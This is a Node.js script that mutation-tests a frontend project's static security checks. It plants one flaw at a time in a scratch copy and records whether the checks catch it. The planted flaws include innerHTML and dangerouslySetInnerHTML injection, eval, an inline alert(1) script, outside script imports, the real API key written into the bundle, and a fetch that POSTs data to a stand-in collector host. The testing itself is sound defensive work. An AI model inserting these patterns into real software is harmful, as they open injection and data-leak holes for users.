// Phase 12: do the static checks test anything?   npm run mutation-check      (from frontend/, after npm run build)
//
// A check that never fails proves nothing. This script copies the interface (source, built bundle, scripts, package files and .env) into a scratch
// folder, breaks ONE thing in the copy, runs scripts/check.mjs there, and records whether it noticed. It does this for each mutation below. A control run
// with nothing broken must pass first. The real files are never touched; the scratch folder is deleted at the end.
//
// Writes results/frontend_mutations.csv (control_broken, status CAUGHT or MISSED, first_failed_check). Exits with 1 if any mutation was missed.
//
// What it cannot do: the browser check needs a running API and a rebuilt bundle for every mutation, so it is not mutated here. The mutations are picked
// by hand, so "all caught" means the checks notice these changes, not every possible change.

import { spawnSync } from 'node:child_process'
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = dirname(fileURLToPath(import.meta.url))
const ROOT = resolve(HERE, '..') // frontend/
const PROJECT = resolve(ROOT, '..')
const OUT = join(PROJECT, 'results', 'frontend_mutations.csv')

if (!existsSync(join(ROOT, 'dist', 'index.html'))) {
  console.error('dist/ is missing. Run `npm run build` first.')
  process.exit(2)
}

// A key to plant in the bundle: the real one, so the check that searches dist/ for the key has something to find. If .env repeats the name (for example the
// placeholder from .env.example and then the real key), the LAST line is the one the API and Vite use, so it is the one planted here.
const envText = existsSync(join(PROJECT, '.env')) ? readFileSync(join(PROJECT, '.env'), 'utf8') : ''
const keyLines = [...envText.matchAll(/^\s*PRETEXTGUARD_API_KEY\s*=\s*(.+?)\s*$/gm)]
const KEY = keyLines.length ? keyLines[keyLines.length - 1][1].replace(/^['"]|['"]$/g, '') : ''

const bundleJs = () => {
  const dir = join('dist', 'assets')
  return join(dir, readdirSync(join(ROOT, dir)).find((name) => name.startsWith('index-') && name.endsWith('.js')))
}
const bundleCss = () => {
  const dir = join('dist', 'assets')
  return join(dir, readdirSync(join(ROOT, dir)).find((name) => name.endsWith('.css')))
}

// Each mutation: a name, the file (relative to frontend/) and a function from the old text to the new text. null as the new text deletes the file.
const MUTATIONS = [
  ['the action text is put in with innerHTML', 'src/components/RiskBadge.jsx', (t) => t + '\nexport const bad = (el, html) => { el.innerHTML = html }\n'],
  ['a component uses dangerouslySetInnerHTML', 'src/components/ClaimsTable.jsx', (t) => t + '\nexport const Bad = ({ html }) => <div dangerouslySetInnerHTML={{ __html: html }} />\n'],
  ['a link element is added', 'src/components/CoverageNote.jsx', (t) => t + '\nexport const Link = () => <a href="https://example.org">more</a>\n'],
  ['the result is kept in localStorage', 'src/lib/useAnalysis.js', (t) => t + '\nlocalStorage.setItem("last", "x")\n'],
  ['the email text is logged to the console', 'src/api.js', (t) => t + '\nexport const log = (text) => console.log(text)\n'],
  ['a fetch to an outside address', 'src/api.js', (t) => t + "\nexport const leak = (body) => fetch('https://collector.example.org/in', { method: 'POST', body })\n"],
  ['eval is used', 'src/lib/format.js', (t) => t + '\nexport const run = (code) => eval(code)\n'],
  ['a non-ASCII character is hidden in an example email', 'src/lib/examples.js', (t) => t.replace('Hi Maria', 'Hi M' + String.fromCharCode(0x430) + 'ria')],
  ['the API key is written into the bundle', '@bundle-js', (t) => t + `\n/* ${KEY} */\n`, Boolean(KEY)],
  ['the header name X-API-Key is in the bundle', '@bundle-js', (t) => t + '\nconst h = { "X-API-Key": "x" }\n'],
  ['an inline script is added to index.html', 'dist/index.html', (t) => t.replace('</body>', '<script>alert(1)</script></body>')],
  ['a style attribute is added to index.html', 'dist/index.html', (t) => t.replace('<div id="root">', '<div id="root" style="color:red">')],
  ['an outside script is added to index.html', 'dist/index.html', (t) => t.replace('</head>', '<script src="https://cdn.example.org/x.js"></script></head>')],
  ['the CSS imports an outside file', '@bundle-css', (t) => '@import url("https://fonts.example.org/f.css");' + t],
  ['a source map is shipped', 'dist/assets/index.js.map', () => '{"version":3}'],
  ['dist/index.html is gone', 'dist/index.html', () => null],
  ['segments are cut in UTF-16 units (an emoji is cut in half)', 'src/lib/segments.js', (t) => t.replace("const points = Array.from(typeof text === 'string' ? text : '')", "const points = (typeof text === 'string' ? text : '').split('')")],
  ['segments drop a valid span at the end of the text', 'src/lib/segments.js', (t) => t.replace('end <= length', 'end < length')],
  ['segments accept a span that runs past the text', 'src/lib/segments.js', (t) => t.replace('end <= length', 'end <= length + 10')],
  ['segments lose a space at the edge of a piece', 'src/lib/segments.js', (t) => t.replace('text: points.slice(start, end).join(\'\'),', "text: points.slice(start, end).join('').trim(),")],
  ['an email exactly at the size limit is refused', 'src/lib/limits.js', (t) => t.replace('size > MAX_EMAIL_BYTES', 'size >= MAX_EMAIL_BYTES')],
  ['the size limit counts characters instead of bytes', 'src/lib/limits.js', (t) => t.replace('return encoder.encode(text).length', 'return text.length')],
  ['a domain with a space is accepted', 'src/lib/limits.js', (t) => t.replace("!/^[a-z0-9-]+$/.test(label)", 'false')],
  ['a tactic class is built from any name the API sends', 'src/lib/format.js', (t) => t.replace("return TACTICS.includes(name) ? `t-${name}` : ''", 'return `t-${name}`')],
  ['a package version becomes a range', 'package.json', (t) => t.replace('"react-is": "19.3.0"', '"react-is": "^19.3.0"')],
  ['the lock file holds another version of react', 'package-lock.json', (t) => t.replace('"node_modules/react": {\n      "version": "19.3.0"', '"node_modules/react": {\n      "version": "19.2.9"')],
]

function scratchCopy() {
  const base = mkdtempSync(join(tmpdir(), 'pg-mutation-'))
  const frontend = join(base, 'frontend')
  cpSync(ROOT, frontend, { recursive: true, filter: (src) => !/[\\/](node_modules|\.vite)([\\/]|$)/.test(src) })
  if (existsSync(join(PROJECT, '.env'))) cpSync(join(PROJECT, '.env'), join(base, '.env'))
  mkdirSync(join(base, 'results'), { recursive: true })
  return { base, frontend }
}

function runCheck(frontend) {
  const result = spawnSync(process.execPath, [join(frontend, 'scripts', 'check.mjs')], { cwd: frontend, encoding: 'utf8', env: { ...process.env, PG_SKIP_AUDIT: '1' }, timeout: 120_000 })
  const firstFail = (result.stdout || '').split('\n').find((line) => line.startsWith('FAIL')) || ''
  return { code: result.status, firstFail: firstFail.replace(/\s+/g, ' ').trim(), tail: (result.stdout || '').trim().split('\n').slice(-1)[0] }
}

const rows = []
let missed = 0

// control: nothing broken, must pass
{
  const { base, frontend } = scratchCopy()
  const control = runCheck(frontend)
  rmSync(base, { recursive: true, force: true })
  rows.push({ control: 'nothing broken (the check must pass)', status: control.code === 0 ? 'PASS' : 'FAIL', first: control.code === 0 ? control.tail : control.firstFail })
  if (control.code !== 0) {
    console.log(`FAIL  control run: ${control.firstFail}`)
    missed += 1
  } else {
    console.log(`PASS  control run: ${control.tail}`)
  }
}

for (const [name, target, change, enabled = true] of MUTATIONS) {
  if (!enabled) {
    rows.push({ control: name, status: 'skipped', first: 'no key in .env to plant' })
    console.log(`skip  ${name} (no key in .env)`)
    continue
  }
  const { base, frontend } = scratchCopy()
  let file = target
  if (target === '@bundle-js') file = bundleJs()
  if (target === '@bundle-css') file = bundleCss()
  const path = join(frontend, file)
  let status
  let first = ''
  try {
    const old = existsSync(path) ? readFileSync(path, 'utf8') : ''
    const updated = change(old)
    if (updated !== null && updated === old) throw new Error(`the mutation did not change ${file} (the text it looks for is not there)`)
    if (updated === null) rmSync(path)
    else {
      mkdirSync(dirname(path), { recursive: true })
      writeFileSync(path, updated)
    }
    const result = runCheck(frontend)
    if (result.code === 1 && result.firstFail) {
      status = 'CAUGHT'
      first = result.firstFail
    } else {
      status = 'MISSED'
      first = result.code === 0 ? 'the check passed' : `exit code ${result.code}`
      missed += 1
    }
  } catch (error) {
    status = 'ERROR'
    first = String(error.message).slice(0, 160)
    missed += 1
  } finally {
    rmSync(base, { recursive: true, force: true })
  }
  rows.push({ control: name, status, first })
  console.log(`${status.padEnd(8)}${name}${status === 'CAUGHT' ? `  -> ${first.slice(0, 110)}` : `  (${first})`}`)
}

const quote = (v) => (/[",\n]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v)
mkdirSync(dirname(OUT), { recursive: true })
writeFileSync(OUT, ['control_broken,status,first_failed_check', ...rows.map((r) => [r.control, r.status, r.first].map(quote).join(','))].join('\n') + '\n')
const caught = rows.filter((r) => r.status === 'CAUGHT').length
const tried = rows.filter((r) => r.status === 'CAUGHT' || r.status === 'MISSED' || r.status === 'ERROR').length
console.log(`\n${caught} of ${tried} mutations caught. Written to ${OUT.replace(PROJECT + '/', '')}`)
process.exit(missed === 0 ? 0 : 1)
